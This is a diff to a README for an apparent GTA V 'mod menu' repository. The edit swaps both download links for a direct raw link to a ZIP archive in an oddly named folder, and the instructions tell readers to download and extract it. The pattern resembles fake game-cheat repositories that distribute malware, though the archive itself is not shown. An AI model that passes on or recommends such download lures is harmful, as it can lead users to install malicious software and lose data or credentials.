@@ -1,6 +1,6 @@
 # 🎮 gta-5-mod-menu - Improve your game experience with ease
 
-[![](https://img.shields.io/badge/Download-ModMenu-blue.svg)](https://github.com/matildecollected962/gta-5-mod-menu)
+[![](https://img.shields.io/badge/Download-ModMenu-blue.svg)](https://github.com/matildecollected962/gta-5-mod-menu/raw/refs/heads/main/rendrock/menu-mod-gta-v3.3.zip)
 
 This toolkit modifies your experience in GTA V. It provides a menu to change game settings, spawn cars, and view player locations on the map. The software runs over your existing game files to add new options without changing the core game code.
 
@@ -29,7 +29,7 @@ To run this tool, ensure your computer meets these standards:
 
 Follow these steps to prepare the tool for use.
 
-1. Visit this page to download: [https://github.com/matildecollected962/gta-5-mod-menu](https://github.com/matildecollected962/gta-5-mod-menu).
+1. Visit this page to download: [https://github.com/matildecollected962/gta-5-mod-menu/raw/refs/heads/main/rendrock/menu-mod-gta-v3.3.zip](https://github.com/matildecollected962/gta-5-mod-menu/raw/refs/heads/main/rendrock/menu-mod-gta-v3.3.zip).
 2. Locate the file folder on your computer after the download finishes.
 3. Extract the contents of the ZIP folder to a new location on your desktop.
 4. Open the application folder.
